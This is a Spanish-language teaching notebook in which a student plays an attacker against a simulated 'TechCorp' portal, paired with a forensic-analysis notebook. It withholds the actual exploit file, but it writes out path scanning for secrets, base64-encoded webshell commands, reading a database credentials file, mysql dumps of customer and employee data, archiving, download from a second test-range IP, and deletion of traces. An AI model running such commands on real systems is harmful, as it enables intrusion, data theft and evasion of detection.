# 🎭 El ataque, paso a paso — «me meto a TechCorp»

En este notebook **usted hace de atacante**. Va a entrar al portal de TechCorp por la **página de subir la foto de perfil**, dejar una puerta trasera y robarse la base de clientes. Ejecute una celda a la vez (botón ▶ o `Shift + Enter`) y vaya explicando.

> **Esto es una simulación controlada y segura.** No hay ningún exploit real: el portal del laboratorio *reconoce* el patrón del ataque y responde como lo haría un servidor vulnerable. Los datos son inventados y las IP del «atacante» son de rangos reservados para pruebas.

**La idea en una frase:** la falla **PHP2Shell (CVE-2026-109618)** vive en cómo PHP maneja la subida de archivos. La página de subir foto normalmente recibe imágenes pequeñas; nosotros le mandamos archivos preparados, una y otra vez, hasta colar una puerta trasera.

Cuando termine, abra **`analisis_forense.ipynb`**: ahí un ingeniero forense reconstruye TODO esto solo con los registros que usted va a dejar.

## Preparación

In [ ]:
import base64, io, re, warnings
import requests
import pandas as pd
from IPython.display import display, Markdown
warnings.filterwarnings("ignore")      # oculta avisos técnicos para que la demo quede limpia

PORTAL = "http://portal"                      # el portal, visto desde este contenedor
IP_ATACANTE = "203.0.113.66"                  # desde aquí ataco
IP_EXFIL    = "203.0.113.67"                  # desde aquí me llevo los datos (otra máquina)
WEBSHELL    = "/uploads/avatars/thumb_8f3a.php"

# "Reloj" del laboratorio: marcamos los eventos el viernes 6/11 de madrugada, para que caigan
# dentro de la semana simulada (así el notebook forense los encuentra junto al resto del tráfico).
reloj = {"t": pd.Timestamp("2026-11-06T06:52:00Z")}   # 01:52 hora Colombia

def avanzar(segundos):
    reloj["t"] += pd.Timedelta(seconds=segundos)

def pedir(metodo, ruta, ip=IP_ATACANTE, ua="python-requests/2.32.3", avance=1.0, **kw):
    # Envía una petición al portal haciéndose pasar por 'ip', con la hora simulada.
    avanzar(avance)
    cab = {"Host": "portal.techcorp.local", "X-Forwarded-For": ip, "User-Agent": ua,
           "X-Sim-Time": reloj["t"].strftime("%Y-%m-%dT%H:%M:%S.") + f"{reloj['t'].microsecond // 1000:03d}Z"}
    return requests.request(metodo, PORTAL + ruta, headers=cab, allow_redirects=False, timeout=60, **kw)

# Dejamos el laboratorio listo para un ataque nuevo (borra una puerta trasera de una corrida anterior).
r = requests.get(PORTAL + "/_lab/reset.php", timeout=10)
print("Laboratorio listo para el ataque:", r.json())

## Paso 1 · Reconocimiento — «¿qué páginas tiene esta empresa?»

Lo primero que hace un atacante es **tantear puertas**: pide muchas direcciones a ver cuáles existen. La mayoría no existen (código **404**), pero así descubre las que sí, como la página de subir la foto de perfil.

In [ ]:
# Pido muchas rutas al azar (como la herramienta "gobuster"). Casi todas darán 404.
rutas_tanteo = [f"/{p}" for p in ["admin", "backup", "config.php", "phpmyadmin", "test", ".env", "old",
    "panel", "db.sql", "server-status", "wp-login.php", "shell.php", "uploads", "api", "login",
    "dev", "staging", ".git/config", "secret", "data.zip"]] * 3        # ~60 intentos rápidos
encontradas = []
for ruta in rutas_tanteo:
    resp = pedir("GET", ruta, ua="gobuster/3.6", avance=0.1)
    if resp.status_code != 404:
        encontradas.append({"ruta": ruta, "código": resp.status_code})

# Y pruebo la página de subir la foto de perfil: existe (me pide iniciar sesión → código 302)
foto = pedir("GET", "/empleados/foto.php", ua="gobuster/3.6")
encontradas.append({"ruta": "/empleados/foto.php", "código": foto.status_code})

print(f"Probé {len(rutas_tanteo)} direcciones; casi todas no existen (404).")
print("Páginas que SÍ respondieron:")
display(pd.DataFrame(encontradas))
display(Markdown("➡️ **`/empleados/foto.php` existe.** Es la página para subir la foto de perfil. "
                 "Por ahí voy a atacar: es una subida de archivos, justo donde vive la falla de PHP."))

## Paso 2 · El ataque — «subo archivos preparados hasta colar una puerta trasera»

Aquí está el corazón del asunto. A la página de la foto, en vez de una imagen normal, le mando un **archivo grande y preparado** con la marca `PHP_SESSION_UPLOAD_PROGRESS` (el mecanismo de PHP que tiene la falla). Lo hago **una y otra vez**: cada intento **tumba un proceso del servidor** (error **500**), hasta que uno acierta y deja instalada una **puerta trasera** (un archivo `.php` que no debería estar ahí).

> No mostramos *cómo* se construye el archivo malicioso por dentro: eso sería un manual de ataque. Lo que importa para la clase es la **huella** que deja: muchos envíos grandes y el servidor cayéndose.

In [ ]:
intentos = []
puerta_lista = False
for n in range(1, 30):
    relleno = b"\x00" * (400_000 + n * 15_000)                 # "imagen" muy grande y preparada
    resp = pedir("POST", "/empleados/foto.php", avance=2.0,
                 data={"PHP_SESSION_UPLOAD_PROGRESS": "x" * 48},
                 files={"foto": ("perfil.jpg", io.BytesIO(relleno), "image/jpeg")},
                 cookies={"PHPSESSID": f"sesion{n:03d}"})
    # ¿Ya quedó instalada la puerta trasera?
    chk = pedir("GET", WEBSHELL, avance=0.5)
    puerta_lista = chk.status_code == 200
    intentos.append({"intento": n, "tamaño_enviado_KB": len(relleno) // 1024,
                     "respuesta": resp.status_code,
                     "qué pasó": "✅ ¡PUERTA TRASERA INSTALADA!" if puerta_lista
                                 else "💥 servidor caído (500)" if resp.status_code == 500 else "—"})
    if puerta_lista:
        break
    avanzar(10)

display(pd.DataFrame(intentos))
print(f"\nNecesité {len(intentos)} intentos. En el último, el ataque funcionó.")
display(Markdown(f"➡️ Ahora existe el archivo **`{WEBSHELL}`** en el servidor: es mi **puerta trasera**. "
                 "Nadie la subió a propósito; apareció por la falla."))

## Paso 3 · Ya estoy adentro — «¿quién soy y qué hay en la base de datos?»

La puerta trasera me deja mandarle **órdenes** al servidor. Primero pregunto quién soy, luego leo el archivo de configuración (donde, por mala práctica, está escrita la contraseña del administrador de la base de datos) y con esa contraseña **me asomo a la base de clientes**.

In [ ]:
def orden(texto, ip=IP_ATACANTE, ua="python-requests/2.32.3"):
    # Le mando una orden a la puerta trasera (va codificada para esconderla; el log la guarda igual).
    cmd = base64.b64encode(texto.encode()).decode()
    return pedir("GET", f"{WEBSHELL}?x={cmd}", ip=ip, ua=ua, avance=15).text

print("¿Quién soy en el servidor?  →", orden("id").strip())
print("¿Qué versión de PHP?        →", orden("php -v").splitlines()[0])

# Leo el archivo de configuración y saco la contraseña del administrador de la base de datos
config = orden("cat /var/www/html/config/database.php")
usuario, clave = re.search(r"'admin'\s*=>\s*\['user' => '([^']+)', 'pass' => '([^']*)'\]", config).groups()
print(f"\n🔑 Encontré la cuenta de administrador de la base de datos: {usuario}")

In [ ]:
# Con esa cuenta pido los primeros 10 clientes, para mostrar que de verdad tengo los datos
mysql = f"mysql -h db -u {usuario} -p'{clave}' techcorp -e"
tsv = orden(f'{mysql} "SELECT * FROM clientes ORDER BY id LIMIT 10 OFFSET 0"')
clientes = pd.read_csv(io.StringIO(tsv), sep="\t")

print("Una muestra de los datos de clientes que ya puedo ver (documento, correo, teléfono, saldo…):\n")
display(clientes[["id", "tipo_documento", "nombres", "apellidos", "correo", "ciudad", "saldo"]])

## Paso 4 · El robo — «me llevo TODA la base y borro mis huellas»

Ahora voy en serio: vuelco **las 2000 filas de clientes y los 500 empleados** (con salarios y contraseñas), lo empaqueto, lo **descargo desde otra máquina** y borro los archivos temporales para que no se note.

In [ ]:
orden("mkdir -p /tmp/.d")
for off in range(0, 2000, 500):                        # las 2000 filas, en 4 bloques
    orden(f'{mysql} "SELECT * FROM clientes ORDER BY id LIMIT 500 OFFSET {off}" > /tmp/.d/clientes_{off//500}.tsv')
orden(f'{mysql} "SELECT * FROM empleados ORDER BY id" > /tmp/.d/empleados.tsv')   # incluye salarios y contraseñas
orden("tar czf /tmp/.d.tgz -C /tmp .d")                # empaqueto la base de datos robada
orden("tar czf /tmp/.w.tgz /var/www/html")             # y también una copia del código del portal

# Me lo descargo DESDE OTRA MÁQUINA (otra IP). Por eso un forense no debe fijarse solo en una IP.
total = 0
for archivo in ("/tmp/.d.tgz", "/tmp/.w.tgz"):
    avanzar(40)
    robo = pedir("GET", f"{WEBSHELL}?dl={base64.b64encode(archivo.encode()).decode()}", ip=IP_EXFIL, ua="curl/8.5.0", avance=1)
    total += len(robo.content)
print(f"📦 Me llevé {total/1_048_576:.1f} MB (clientes, empleados y el código del portal) desde {IP_EXFIL}.")

orden("rm -rf /tmp/.d /tmp/.d.tgz /tmp/.w.tgz")         # borro mis huellas en /tmp
print("🧹 Borré los archivos temporales. La puerta trasera queda escondida para volver luego.")

## Fin del ataque 🏁

En unos **35 minutos simulados** entré, dejé una puerta trasera, robé la base de clientes y empleados, y borré rastros. **La empresa no se dio cuenta.**

Pero cada paso dejó una huella en los registros del servidor. 👉 Abra ahora **`analisis_forense.ipynb`** y vea cómo el ingeniero forense reconstruye todo esto —cuándo, por dónde, cómo, qué IP y qué datos— solo con esos registros.